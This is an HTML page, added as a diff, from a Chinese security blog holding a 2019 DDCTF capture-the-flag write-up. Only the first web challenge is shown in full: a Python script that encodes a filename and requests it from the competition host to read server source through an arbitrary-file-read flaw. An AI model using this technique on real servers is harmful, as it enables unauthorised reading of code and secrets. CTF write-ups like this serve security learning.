@@ -1,0 +1,723 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta name="baidu-site-verification" content="zTujQKnJ3B">
+  <meta name="google-site-verification" content="mFwbH0kPkAgWCJvSVXe6kF8tqqjhl56sE_x1HwJEXmU">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000">
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top">
+  
+  
+  <title>2019-DDCTF-writeup | Shym&#39;s Blog</title>
+  <meta name="description" content="这次比赛一共解出3题Web、1题Misc的流量分析和1个签到，总共拿到561分。排名目前在224名。因为主办方现在还在ban掉作弊选手，所以还有上升空间（手动滑稽～） Web解题思路一、滴～靶机：http://117.51.150.246知识点：任意文件读取、加解密、脑洞、extract变量覆盖 1、打开靶机 2、在URL中发现可能为任意文件读取，但是文件名被加密，然后我们先去解密经过Base64">
+<meta name="keywords" content="2019-DDCTF-writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019-DDCTF-writeup">
+<meta property="og:url" content="https:///login546.github.io/2019/04/19/2019-DDCTF-writeup/index.html">
+<meta property="og:site_name" content="shym&#39;s blog">
+<meta property="og:description" content="这次比赛一共解出3题Web、1题Misc的流量分析和1个签到，总共拿到561分。排名目前在224名。因为主办方现在还在ban掉作弊选手，所以还有上升空间（手动滑稽～） Web解题思路一、滴～靶机：http://117.51.150.246知识点：任意文件读取、加解密、脑洞、extract变量覆盖 1、打开靶机 2、在URL中发现可能为任意文件读取，但是文件名被加密，然后我们先去解密经过Base64">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/56410132-9da24600-62ae-11e9-8ee1-ed886764039f.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/56410361-6da77280-62af-11e9-8ed8-e1207357f4b1.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/56410583-266db180-62b0-11e9-95a0-dea35b9cf65c.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/56410957-a47e8800-62b1-11e9-9062-a6f42be9f51d.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/56411544-af3a1c80-62b3-11e9-9ffb-753e66bc2444.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/56411746-5ae36c80-62b4-11e9-9f72-bf47be8a1ef9.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/56411959-29b76c00-62b5-11e9-9729-ca87df0be002.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/56413773-27581080-62bb-11e9-926f-9dcdcb28d994.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/56412137-caa62700-62b5-11e9-8cce-c33bdec84bb6.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/56412320-4acc8c80-62b6-11e9-89a9-5fa3f4be196e.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/56412587-55d3ec80-62b7-11e9-9d02-3c714d4df416.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/56413294-99c7f100-62b9-11e9-82f9-77c9d8e706ba.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/56414702-0b09a300-62be-11e9-8592-215823d406fe.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/56415105-45277480-62bf-11e9-8503-938ce3ca7efb.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/56414665-e1e91280-62bd-11e9-923f-85c423939e56.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/56416875-c6cdd100-62c4-11e9-82a2-a2006dee1132.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/56417106-71de8a80-62c5-11e9-947d-4d43892a1c12.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/56417155-9aff1b00-62c5-11e9-8fbb-fad006d6dafa.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/56417422-75bedc80-62c6-11e9-8bc2-22e04f408610.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/56417436-85d6bc00-62c6-11e9-9785-a6d32c5f4f95.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/56417710-57a5ac00-62c7-11e9-9a85-4fc004ba1669.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/56418102-8c663300-62c8-11e9-93bb-dcd09e00c8a1.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/56418180-c6373980-62c8-11e9-95c4-7b2bea1d74c5.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/56418271-01396d00-62c9-11e9-9a1c-9aaadd5beb6a.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/56418545-c257e700-62c9-11e9-8a5d-ac903fddf422.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/56418862-da7c3600-62ca-11e9-9805-e53358e94223.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/56419064-8faeee00-62cb-11e9-9ed8-c9412fa5448c.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/56419440-d5b88180-62cc-11e9-8841-93adcc1fe2dc.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/56420096-39dc4500-62cf-11e9-82bd-7bc1018d440d.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/56420099-3e086280-62cf-11e9-8358-df1c645d7d83.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/56420285-ea4a4900-62cf-11e9-9e9a-6c21ae0f1f25.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/56420420-79576100-62d0-11e9-94b5-7f55ecb987df.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/56420426-7bb9bb00-62d0-11e9-8033-1fab298125ec.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/56420495-bf142980-62d0-11e9-8634-ff79ec22cfc2.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/56420509-caffeb80-62d0-11e9-938b-9986e8aa3f30.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/56420579-229e5700-62d1-11e9-8015-5e603f2493cc.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/56420583-2631de00-62d1-11e9-94ef-94ffbcae77cb.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/56420643-6a24e300-62d1-11e9-8cb2-8d7065434f3a.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/56420660-7872ff00-62d1-11e9-8970-c896fbcbc723.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/38073810/56420667-7ad55900-62d1-11e9-8c92-84712473ed11.png">
+<meta property="og:updated_time" content="2021-01-22T08:48:08.990Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2019-DDCTF-writeup">
+<meta name="twitter:description" content="这次比赛一共解出3题Web、1题Misc的流量分析和1个签到，总共拿到561分。排名目前在224名。因为主办方现在还在ban掉作弊选手，所以还有上升空间（手动滑稽～） Web解题思路一、滴～靶机：http://117.51.150.246知识点：任意文件读取、加解密、脑洞、extract变量覆盖 1、打开靶机 2、在URL中发现可能为任意文件读取，但是文件名被加密，然后我们先去解密经过Base64">
+<meta name="twitter:image" content="https://user-images.githubusercontent.com/38073810/56410132-9da24600-62ae-11e9-8ee1-ed886764039f.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="https:///login546.github.io/2019/04/19/2019-DDCTF-writeup/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="shym&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+  
+  
+  
+</head>
+
+
+<body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/login546" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">Shym</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">Web Penetration &amp; Safe</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Nanjing, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="搜索">
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech>
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav menu-highlight">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">首页</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">归档</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">分类</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">标签</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="icon icon-project"></i>
+            
+            <span class="menu-title">项目</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">友链</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">关于</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/login546" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle="tooltip" data-placement="top"><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">公告</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>欢迎交流与分享经验!</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Bypass/">Bypass</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/ctf/">ctf</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/writeup/">writeup</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/">渗透测试</a><span class="category-list-count">4</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/工具/">工具</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞复现/">漏洞复现</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/通用漏洞挖掘/">通用漏洞挖掘</a><span class="category-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget-body">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/2019-DDCTF-writeup/">2019-DDCTF-writeup</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/2019年工业信息安全技能大赛个人线上赛-第一场/">2019年工业信息安全技能大赛个人线上赛(第一场)</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTFhub/">CTFhub</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTFhub-RCE/">CTFhub-RCE</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CVE-2019-0708/">CVE-2019-0708</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CVE-2019-13272/">CVE-2019-13272</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CVE-2019-14287/">CVE-2019-14287</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CVE-2020-0796/">CVE-2020-0796</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Joomla3-0-0-3-4-5-RCE/">Joomla3.0.0-3.4.5 RCE</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ices/">ices</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlmap参数详解/">sqlmap参数详解</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/存储型xss/">存储型xss</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/搜索引擎利用/">搜索引擎利用</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/文件上传姿势总结/">文件上传姿势总结</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/文件包含漏洞/">文件包含漏洞</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/爬虫/">爬虫</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget-body tagcloud">
+      <a href="/tags/2019-DDCTF-writeup/" style="font-size: 13px;">2019-DDCTF-writeup</a> <a href="/tags/2019年工业信息安全技能大赛个人线上赛-第一场/" style="font-size: 13px;">2019年工业信息安全技能大赛个人线上赛(第一场)</a> <a href="/tags/CTFhub/" style="font-size: 13px;">CTFhub</a> <a href="/tags/CTFhub-RCE/" style="font-size: 13px;">CTFhub-RCE</a> <a href="/tags/CVE-2019-0708/" style="font-size: 13px;">CVE-2019-0708</a> <a href="/tags/CVE-2019-13272/" style="font-size: 13px;">CVE-2019-13272</a> <a href="/tags/CVE-2019-14287/" style="font-size: 13px;">CVE-2019-14287</a> <a href="/tags/CVE-2020-0796/" style="font-size: 13px;">CVE-2020-0796</a> <a href="/tags/Joomla3-0-0-3-4-5-RCE/" style="font-size: 13px;">Joomla3.0.0-3.4.5 RCE</a> <a href="/tags/ices/" style="font-size: 13px;">ices</a> <a href="/tags/sqlmap参数详解/" style="font-size: 13px;">sqlmap参数详解</a> <a href="/tags/存储型xss/" style="font-size: 13px;">存储型xss</a> <a href="/tags/搜索引擎利用/" style="font-size: 13px;">搜索引擎利用</a> <a href="/tags/文件上传姿势总结/" style="font-size: 13px;">文件上传姿势总结</a> <a href="/tags/文件包含漏洞/" style="font-size: 13px;">文件包含漏洞</a> <a href="/tags/爬虫/" style="font-size: 13px;">爬虫</a>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">四月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">三月 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">二月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">七月 2019</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">五月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">四月 2019</a><span class="archive-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/漏洞复现/">漏洞复现</a>
+              </p>
+              <p class="item-title">
+                <a href="/2020/04/01/CVE-2020-0796复现/" class="title">CVE-2020-0796复现</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-04-01T15:25:05.000Z" itemprop="datePublished">2020-04-01</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/Bypass/">Bypass</a>
+              </p>
+              <p class="item-title">
+                <a href="/2020/03/17/RCE远程命令执行绕过/" class="title">RCE远程命令执行绕过</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-03-17T17:01:45.000Z" itemprop="datePublished">2020-03-17</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/writeup/">writeup</a>
+              </p>
+              <p class="item-title">
+                <a href="/2020/03/04/CTFhub注入题目/" class="title">CTFhub注入题目</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-03-04T16:46:33.000Z" itemprop="datePublished">2020-03-04</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/通用漏洞挖掘/">通用漏洞挖掘</a>
+              </p>
+              <p class="item-title">
+                <a href="/2020/02/21/某智慧校园系统存储型xss/" class="title">某智慧校园系统存储型xss</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-02-21T22:45:21.000Z" itemprop="datePublished">2020-02-21</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/python/">python</a>
+              </p>
+              <p class="item-title">
+                <a href="/2019/12/30/爬区国内所有高校官网地址/" class="title">爬区国内所有高校名单</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2019-12-30T11:26:50.000Z" itemprop="datePublished">2019-12-30</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <nav id="toc" class="article-toc">
+      <h3 class="toc-title">文章目录</h3>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web解题思路"><span class="toc-number">1.</span> <span class="toc-text">Web解题思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、滴～"><span class="toc-number">1.1.</span> <span class="toc-text">一、滴～</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、打开靶机"><span class="toc-number">1.1.1.</span> <span class="toc-text">1、打开靶机</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、在URL中发现可能为任意文件读取，但是文件名被加密，然后我们先去解密"><span class="toc-number">1.1.2.</span> <span class="toc-text">2、在URL中发现可能为任意文件读取，但是文件名被加密，然后我们先去解密</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3、构造index-php"><span class="toc-number">1.1.3.</span> <span class="toc-text">3、构造index.php</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4、构造practice-txt-swp"><span class="toc-number">1.1.4.</span> <span class="toc-text">4、构造practice.txt.swp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5、构造f1ag-ddctf-php"><span class="toc-number">1.1.5.</span> <span class="toc-text">5、构造f1ag!ddctf.php</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、WEB签到题"><span class="toc-number">1.2.</span> <span class="toc-text">二、WEB签到题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、查看js-didictf-username"><span class="toc-number">1.2.1.</span> <span class="toc-text">1、查看js, didictf_username</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、Burpsuite抓包，修改didictf-username为admin，得到目录"><span class="toc-number">1.2.2.</span> <span class="toc-text">2、Burpsuite抓包，修改didictf_username为admin，得到目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3、访问app-fL2XID2i0Cdh-php-得到源码"><span class="toc-number">1.2.3.</span> <span class="toc-text">3、访问app/fL2XID2i0Cdh.php,得到源码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4、分析代码"><span class="toc-number">1.2.4.</span> <span class="toc-text">4、分析代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5、构造session"><span class="toc-number">1.2.5.</span> <span class="toc-text">5、构造session</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三、Upload-IMG"><span class="toc-number">1.3.</span> <span class="toc-text">三、Upload-IMG</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、上传文件"><span class="toc-number">1.3.1.</span> <span class="toc-text">1、上传文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、文件对比"><span class="toc-number">1.3.2.</span> <span class="toc-text">2、文件对比</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3、生成payload并上传"><span class="toc-number">1.3.3.</span> <span class="toc-text">3、生成payload并上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4、Get-Flag"><span class="toc-number">1.3.4.</span> <span class="toc-text">4、Get Flag</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc解题思路"><span class="toc-number">2.</span> <span class="toc-text">Misc解题思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、Wireshark"><span class="toc-number">2.1.</span> <span class="toc-text">一、Wireshark</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、下载文件"><span class="toc-number">2.1.1.</span> <span class="toc-text">1、下载文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、文件分析"><span class="toc-number">2.1.2.</span> <span class="toc-text">2、文件分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3、图片解密"><span class="toc-number">2.1.3.</span> <span class="toc-text">3、图片解密</span></a></li></ol></li></ol></li></ol>
+    </nav>
+  </div>
+</aside>
+
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-2019-DDCTF-writeup" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      2019-DDCTF-writeup
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2019/04/19/2019-DDCTF-writeup/" class="article-date">
+	  <time datetime="2019-04-19T14:00:12.000Z" itemprop="datePublished">2019-04-19</time>
+	</a>
+</span>
+        
+  <span class="article-category">
+    <i class="icon icon-folder"></i>
+    <a class="article-category-link" href="/categories/ctf/">ctf</a>
+  </span>
+
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link" href="/tags/2019-DDCTF-writeup/">2019-DDCTF-writeup</a>
+  </span>
+
+
+        
+	<span class="article-read hidden-xs">
+	    <i class="icon icon-eye-fill" aria-hidden="true"></i>
+	    <span id="busuanzi_container_page_pv">
+			<span id="busuanzi_value_page_pv">0</span>
+		</span>
+	</span>
+
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2019/04/19/2019-DDCTF-writeup/#comments" class="article-comment-link">评论</a></span>
+        
+	
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 1.7k(字)</span>
+	
+	
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 8(分)</span>
+	
+
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <p>这次比赛一共解出3题Web、1题Misc的流量分析和1个签到，总共拿到561分。<br>排名目前在224名。因为主办方现在还在ban掉作弊选手，所以还有上升空间（手动滑稽～）<br><img src="https://user-images.githubusercontent.com/38073810/56410132-9da24600-62ae-11e9-8ee1-ed886764039f.png" alt="dd1"></p>
+<h2 id="Web解题思路"><a href="#Web解题思路" class="headerlink" title="Web解题思路"></a>Web解题思路</h2><h3 id="一、滴～"><a href="#一、滴～" class="headerlink" title="一、滴～"></a>一、滴～</h3><p><img src="https://user-images.githubusercontent.com/38073810/56410361-6da77280-62af-11e9-8ed8-e1207357f4b1.png" alt="dd2"><br>靶机：<a href="http://117.51.150.246" target="_blank" rel="noopener">http://117.51.150.246</a><br>知识点：任意文件读取、加解密、脑洞、extract变量覆盖</p>
+<h4 id="1、打开靶机"><a href="#1、打开靶机" class="headerlink" title="1、打开靶机"></a>1、打开靶机</h4><p><img src="https://user-images.githubusercontent.com/38073810/56410583-266db180-62b0-11e9-95a0-dea35b9cf65c.png" alt="image"></p>
+<h4 id="2、在URL中发现可能为任意文件读取，但是文件名被加密，然后我们先去解密"><a href="#2、在URL中发现可能为任意文件读取，但是文件名被加密，然后我们先去解密" class="headerlink" title="2、在URL中发现可能为任意文件读取，但是文件名被加密，然后我们先去解密"></a>2、在URL中发现可能为任意文件读取，但是文件名被加密，然后我们先去解密</h4><p><img src="https://user-images.githubusercontent.com/38073810/56410957-a47e8800-62b1-11e9-9062-a6f42be9f51d.png" alt="image"><br>经过Base64解密–&gt;Base64解密–&gt;Base16解密 得到原目录名flag.jpg</p>
+<h4 id="3、构造index-php"><a href="#3、构造index-php" class="headerlink" title="3、构造index.php"></a>3、构造index.php</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">u = <span class="string">'index.php'</span></span><br><span class="line"></span><br><span class="line">jpg = base64.b64encode(base64.b64encode(<span class="string">""</span>.join(<span class="string">"&#123;:02x&#125;"</span>.format(ord(c)) <span class="keyword">for</span> c <span class="keyword">in</span> u).encode(<span class="string">'utf-8'</span>))).decode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">'http://117.51.150.246/index.php'</span>, params=&#123;<span class="string">'jpg'</span>: jpg&#125;)</span><br><span class="line"></span><br><span class="line">print(r.url)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
